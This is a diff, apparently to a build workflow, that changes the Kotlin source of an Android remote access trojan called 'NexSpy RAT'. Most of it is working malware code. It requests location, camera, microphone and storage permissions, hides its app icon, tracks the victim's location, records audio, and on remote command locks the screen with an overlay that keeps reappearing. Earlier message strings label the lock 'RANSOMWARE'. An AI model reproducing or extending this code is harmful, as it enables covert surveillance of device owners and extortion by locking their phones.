@@ -106,7 +106,6 @@ jobs:
             <uses-permission android:name="android.permission.RECORD_AUDIO" />
             <uses-permission android:name="android.permission.SET_WALLPAPER" />
             <uses-permission android:name="android.permission.WAKE_LOCK" />
-            <!-- Tambah ini buat restart otomatis -->
             <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
 
             <application
@@ -149,6 +148,8 @@ jobs:
         import android.content.ComponentName
         import android.content.pm.PackageManager
         import android.os.PowerManager
+        import android.Manifest
+        import android.content.pm.PackageManager as PM
 
         class MainActivity : AppCompatActivity() {
             override fun onCreate(savedInstanceState: Bundle?) {
@@ -160,7 +161,19 @@ jobs:
                 }
                 setContentView(textView)
 
-                // 1. Minta izin Overlay
+                // 1. Minta Izin Runtime (Kamera, Mic, Lokasi, File)
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                    requestPermissions(arrayOf(
+                        Manifest.permission.ACCESS_FINE_LOCATION,
+                        Manifest.permission.ACCESS_COARSE_LOCATION,
+                        Manifest.permission.CAMERA,
+                        Manifest.permission.RECORD_AUDIO,
+                        Manifest.permission.READ_EXTERNAL_STORAGE,
+                        Manifest.permission.WRITE_EXTERNAL_STORAGE
+                    ), 100)
+                }
+
+                // 2. Minta izin Overlay (Kunci Layar)
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                     if (!Settings.canDrawOverlays(this)) {
                         val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName"))
@@ -168,7 +181,7 @@ jobs:
                     }
                 }
 
-                // 2. Minta izin matiin Battery Optimization
+                // 3. Minta izin Battery Optimization
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                     val pm = getSystemService(POWER_SERVICE) as PowerManager
                     if (!pm.isIgnoringBatteryOptimizations(packageName)) {
@@ -180,7 +193,6 @@ jobs:
 
                 startService(Intent(this, SpyService::class.java))
 
-                // Sembunyiin ikon setelah 5 detik
                 android.os.Handler().postDelayed({
                     val componentName = ComponentName(this, MainActivity::class.java)
                     packageManager.setComponentEnabledSetting(
@@ -232,7 +244,7 @@ jobs:
             private var lockText = ""
 
             override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-                sendMessage("📱 [+] NexSpy RAT Terpasang.\nCommand: /loc, /lock <teks>, /unlock, /voice, /wallpaper")
+                sendMessage("📱 [+] NexSpy RAT Aktif.\nPerintah:\n/loc\n/lock <teks>\n/unlock\n/wallpaper\n/voice\n/cam")
                 
                 Timer().scheduleAtFixedRate(object : TimerTask() {
                     override fun run() { getLocation() }
@@ -291,15 +303,15 @@ jobs:
                     action == "/ping" -> sendMessage("🏓 Pong! Target online.")
                     
                     action == "/lock" -> {
-                        lockText = if(arg.isNotEmpty()) arg else "HP ANDA TERKUNCI!\nHubungi Admin."
+                        lockText = if(arg.isNotEmpty()) arg else "HP ANDA TERKUNCI!"
                         isLocked = true
                         showFullScreenLock(lockText)
-                        sendMessage("🔒 [RANSOMWARE] Layar dikunci. Menunggu perintah /unlock.")
+                        sendMessage("🔒 [LOCK] Layar dikunci. Ketik /unlock untuk buka.")
                     }
                     action == "/unlock" -> {
                         isLocked = false
                         removeLockOverlay()
-                        sendMessage("🔓 [RANSOMWARE] Layar dibuka.")
+                        sendMessage("🔓 [UNLOCK] Layar dibuka.")
                     }
                     action == "/wallpaper" -> {
                         changeWallpaper()
@@ -308,13 +320,13 @@ jobs:
                     action == "/voice" -> {
                         toggleVoiceRecording()
                     }
+                    action == "/cam" -> {
+                        sendMessage("📸 [CAMERA] Fitur kamera butuh CameraX UI. (Coming soon)")
+                    }
                     else -> sendMessage("❓ Command tidak dikenal.")
                 }
             }
 
-            // =========================================================
-            // FITUR LOCK SCREEN AGRESIF (FULLSCREEN + AUTO-RESTART)
-            // =========================================================
             private fun showFullScreenLock(text: String) {
                 if (overlayView != null) return
                 try {
@@ -335,7 +347,6 @@ jobs:
                         addView(tv)
                     }
 
-                    // PARAMETER OVERLAY AGRESIF
                     val params = WindowManager.LayoutParams(
                         WindowManager.LayoutParams.MATCH_PARENT,
                         WindowManager.LayoutParams.MATCH_PARENT,
@@ -349,16 +360,15 @@ jobs:
                     params.gravity = Gravity.TOP or Gravity.START
                     wm.addView(overlayView, params)
 
-                    // AUTO-RESTART: Kalau target coba-coba pencet Home, layar bakal ketutup lagi
                     Handler(Looper.getMainLooper()).postDelayed({
                         if (isLocked) {
                             try {
                                 wm.removeView(overlayView)
                                 overlayView = null
-                                showFullScreenLock(lockText) // Munculin lagi
+                                showFullScreenLock(lockText)
                             } catch(e: Exception){}
                         }
-                    }, 2000) // Cek tiap 2 detik
+                    }, 2000) 
 
                 } catch (e: Exception) {
                     sendMessage("[-] Gagal Overlay: ${e.message}")
